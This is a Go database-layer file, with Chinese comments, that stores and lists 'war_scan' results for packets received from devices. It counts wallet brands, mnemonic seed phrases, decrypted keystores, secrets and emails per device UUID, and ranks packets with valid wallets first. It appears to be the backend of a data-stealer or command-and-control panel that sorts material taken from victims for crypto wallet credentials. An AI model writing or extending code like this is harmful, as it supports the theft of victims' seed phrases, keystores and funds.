package store

// /war 自动检测结果（war_scan 表）存取。

func clipStr(s string, n int) string {
	if len(s) > n {
		return s[:n]
	}
	return s
}

// SaveWarScan 写入/更新一条 war 检测结果。
func SaveWarScan(packetID int64, uuid string, ok bool, brands string,
	mnemonicCnt, validCnt, keystoreDec, secretsCnt int, emails, detailJSON, errMsg string) {
	db := GetDB()
	if db == nil {
		return
	}
	ts, _ := Now()
	db.Exec("INSERT INTO war_scan(packet_id,uuid,analyzed_ts,ok,brands,mnemonic_cnt,valid_cnt,"+
		"keystore_dec,secrets_cnt,emails,detail_json,err) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)"+
		" ON DUPLICATE KEY UPDATE uuid=VALUES(uuid), analyzed_ts=VALUES(analyzed_ts), ok=VALUES(ok),"+
		" brands=VALUES(brands), mnemonic_cnt=VALUES(mnemonic_cnt), valid_cnt=VALUES(valid_cnt),"+
		" keystore_dec=VALUES(keystore_dec), secrets_cnt=VALUES(secrets_cnt), emails=VALUES(emails),"+
		" detail_json=VALUES(detail_json), err=VALUES(err)",
		packetID, clipStr(uuid, 128), ts, b2i(ok), clipStr(brands, 512),
		mnemonicCnt, validCnt, keystoreDec, secretsCnt,
		clipStr(emails, 1024), detailJSON, clipStr(errMsg, 255))
}

// ListWarScans 分页读检测结果（命中优先）。onlyHit=true 仅返回有助记词/keystore 解密的。
func ListWarScans(page, per int, onlyHit bool) map[string]any {
	db := GetDB()
	if page < 1 {
		page = 1
	}
	if per < 1 || per > 500 {
		per = 50
	}
	where := ""
	if onlyHit {
		where = " WHERE mnemonic_cnt>0 OR keystore_dec>0"
	}
	total := 0
	if row := db.QueryOne("SELECT COUNT(*) n FROM war_scan" + where); row != nil {
		total = int(toInt(row["n"]))
	}
	rows := db.Query("SELECT packet_id,uuid,analyzed_ts,ok,brands,mnemonic_cnt,valid_cnt,"+
		"keystore_dec,secrets_cnt,emails,err,(detail_json IS NOT NULL AND detail_json<>'') AS has_detail"+
		" FROM war_scan"+where+
		" ORDER BY valid_cnt DESC, keystore_dec DESC, mnemonic_cnt DESC, analyzed_ts DESC LIMIT ? OFFSET ?",
		per, (page-1)*per)
	out := make([]map[string]any, 0, len(rows))
	for _, r := range rows {
		out = append(out, map[string]any{
			"packet_id": toInt(r["packet_id"]), "uuid": toStr(r["uuid"]),
			"analyzed_ts": toStr(r["analyzed_ts"]), "ok": toInt(r["ok"]) == 1,
			"brands": toStr(r["brands"]), "mnemonic_cnt": toInt(r["mnemonic_cnt"]),
			"valid_cnt": toInt(r["valid_cnt"]), "keystore_dec": toInt(r["keystore_dec"]),
			"secrets_cnt": toInt(r["secrets_cnt"]), "emails": toStr(r["emails"]),
			"err": toStr(r["err"]), "has_detail": toInt(r["has_detail"]) == 1,
		})
	}
	return map[string]any{"rows": out, "total": total, "page": page, "per": per}
}

// WarScanStats 汇总。
func WarScanStats() map[string]any {
	db := GetDB()
	out := map[string]any{"scanned": 0, "valid": 0, "keystores": 0, "mnemonics": 0}
	if db == nil {
		return out
	}
	if row := db.QueryOne("SELECT COUNT(*) n, COALESCE(SUM(valid_cnt),0) v, " +
		"COALESCE(SUM(keystore_dec),0) k, COALESCE(SUM(mnemonic_cnt),0) m FROM war_scan"); row != nil {
		out["scanned"] = toInt(row["n"])
		out["valid"] = toInt(row["v"])
		out["keystores"] = toInt(row["k"])
		out["mnemonics"] = toInt(row["m"])
	}
	return out
}

// PendingWarPackets 尚未检测的 war 包（含文件路径），最多 limit 个。
func PendingWarPackets(limit int) []map[string]any {
	db := GetDB()
	if db == nil {
		return nil
	}
	if limit <= 0 || limit > 100000 {
		limit = 100000
	}
	return db.Query(`
        SELECT p.id AS packet_id, p.file_path,
          (SELECT m.value FROM packet_meta m
            WHERE m.packet_id=p.id AND m.field IN ('lhu','device_uuid','uuid') AND m.value<>'' LIMIT 1) AS uuid
        FROM packets p
        LEFT JOIN war_scan w ON w.packet_id=p.id
        WHERE p.endpoint='war' AND p.file_path<>'' AND w.packet_id IS NULL
        ORDER BY p.recv_epoch DESC LIMIT ?`, limit)
}

// WarScanDetail 单包详情（原始报告 JSON）。
func WarScanDetail(packetID int64) map[string]any {
	db := GetDB()
	if db == nil {
		return nil
	}
	row := db.QueryOne("SELECT detail_json FROM war_scan WHERE packet_id=?", packetID)
	if row == nil {
		return nil
	}
	return map[string]any{"packet_id": packetID, "detail_json": toStr(row["detail_json"])}
}
